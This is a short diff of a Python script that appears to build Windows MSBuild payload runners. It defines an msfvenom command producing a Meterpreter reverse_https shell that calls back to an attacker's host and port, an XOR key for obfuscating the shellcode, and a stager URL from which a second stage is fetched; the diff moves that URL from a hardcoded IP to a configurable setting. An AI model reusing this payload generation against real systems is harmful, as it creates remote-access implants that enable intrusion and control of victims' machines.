@@ -7,7 +7,7 @@ import subprocess
 BASE_FILENAME = 'win_msbuild_runner'
 MSFVENOM_CMD = f"msfvenom --platform Windows -p windows/meterpreter/reverse_https LHOST={ak.LHOST} LPORT={ak.LPORT} -f raw -e generic/none"
 XOR_KEY = b'\x09'
-STAGER_URL = "http://192.168.49.65/winmsbuildrunner_s2"
+STAGER_URL = ak.STAGER_URL + "_winmsbuildrunner"
 
 def generate(shellcode):
 
